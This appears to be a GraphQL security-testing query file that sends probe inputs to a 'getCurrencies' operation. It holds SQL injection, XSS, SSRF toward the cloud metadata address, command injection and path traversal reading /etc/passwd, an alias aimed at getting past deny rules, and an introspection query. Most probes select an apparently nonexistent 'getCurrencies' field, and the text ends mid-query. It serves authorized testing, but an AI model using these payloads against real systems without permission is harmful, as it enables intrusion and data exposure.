query.query:
query {
  getCurrencies(input: {}) {
    id
    abbreviation
    symbol
    rate
    country
  }
}

query {
  # Providing a string payload to the input argument to probe backend SQL handling (type-mismatch allowed)
  getCurrencies(input: "1' OR '1'='1' -- ") {
    getCurrencies
    abbreviation
    symbol
    rate
    country
  }
}

query {
  # Inject a typical XSS payload in input to see if any values are reflected unsafely
  getCurrencies(input: "<script>alert('xss')</script>") {
    getCurrencies
    abbreviation
    symbol
    rate
    country
  }
}

query {
  # Probe for SSRF by sending a metadata service URL; backend might fetch it if input used in server-side requests
  getCurrencies(input: "http://169.254.169.254/latest/meta-data/") {
    getCurrencies
    abbreviation
    symbol
    rate
    country
  }
}

query {
  # Attempt common command-injection style payloads in input to detect unsafe shell interpolation
  getCurrencies(input: "|| cat /etc/passwd ||") {
    getCurrencies
    abbreviation
    symbol
    rate
    country
  }
}

query {
  # Test path traversal / file path injection vectors
  getCurrencies(input: "../../etc/passwd") {
    getCurrencies
    abbreviation
    symbol
    rate
    country
  }
}

query {
  # HTML content that could be rendered unsafely on clients or admin UIs
  getCurrencies(input: "<div><img src=x onerror=\"alert('html')\"></div>") {
    getCurrencies
    abbreviation
    symbol
    rate
    country
  }
}

query {
  # Non-aliased normal structure to exercise access controls for getCurrencies
  getCurrencies(input: {}) {
    getCurrencies
    abbreviation
    symbol
    rate
    country
  }
}

query {
  # Same operation but aliased to attempt bypassing simple name-based deny rules
  s: getCurrencies(input: {}) {
    getCurrencies
    abbreviation
    symbol
    rate
    country
  }
}

query {
  # Combine a normal getCurrencies call with an introspection query to detect if introspection is allowed
  getCurrencies(input: {}) {
    getCurrencies
    abbreviation
    symbol
    rate
    country
  }
  __schema {
    types {
      name
      fields {
        name
      }
    }
  }
}

query {
